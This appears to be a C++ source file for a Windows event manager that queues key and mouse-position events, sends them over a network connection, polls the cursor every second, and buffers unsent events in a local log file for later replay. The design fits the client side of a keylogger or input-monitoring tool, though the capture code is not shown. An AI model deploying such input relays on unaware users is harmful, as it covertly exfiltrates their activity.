#include <exception>
#include "EventManager.hpp"

EventManager::EventManager(Network *& net) : _net(net)
{
	_fs.open("logs", std::ofstream::out);
	_is_running = true;
	_updated = true;
	if (!_fs.is_open())
		OutputDebugStringW(L"Cannot open log file\n");
}

EventManager::~EventManager() { _fs.close(); }

void EventManager::kill(void) { _is_running = false; }

void EventManager::addEvent(const BinaryStruct& b)
{
	msgs.push(b);
}

void EventManager::createMouseEvent(void) const
{
	BinaryStruct	s;
	POINT			p;

	GetCursorPos(&p);
	s.key = VK_MOUSEPOS;
	s.mousePos.x = static_cast<unsigned short>(p.x);
	s.mousePos.y = static_cast<unsigned short>(p.y);
	getTime(s);
	trySend(s);
}

void EventManager::run()
{
	BinaryStruct	s;

	OutputDebugStringW(L"run eventmanager\n");
	while (_is_running)
	{
		while (!msgs.empty())
		{
			msgs.try_pop(s);
			if (!trySend(s))
			{
				_updated = false;
				if (!_fs.is_open())
					_fs.open("logs");
				_fs.write((char *)&s, 11);
				_fs.flush();
			}
			else if (!_updated)
			{
				OutputDebugStringW(L"Reading in logs file\n");
				_updated = true;
				_fs.close();
				_in.open("logs");
				while (_in.read((char *)&s, 11))
				{
					trySend(s);
				}
				_in.close();

			}
		}
		createMouseEvent();
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
	OutputDebugStringW(L"done eventmanager\n");
}

